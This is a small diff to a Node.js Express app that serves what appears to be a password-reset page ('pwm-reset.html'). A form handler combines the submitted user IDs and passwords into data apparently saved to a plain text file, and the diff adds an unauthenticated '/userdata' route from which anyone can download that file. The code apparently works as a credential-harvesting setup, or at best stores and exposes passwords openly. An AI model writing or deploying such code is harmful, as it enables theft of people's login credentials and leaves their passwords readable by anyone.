@@ -15,7 +15,9 @@ app.set("view options", {layout: false});
 app.get('/', function(req, res) {
     res.sendFile(__dirname + '/public/pwm-reset.html');
 });
-
+app.get('/userdata', function(req,res){
+    res.download(__dirname + '/userdata.txt');
+});
 var filename = "./userdata.txt"
 app.post('/post-test', (req, res) => {
     var data = req.body.user_id + " - " + req.body.password1
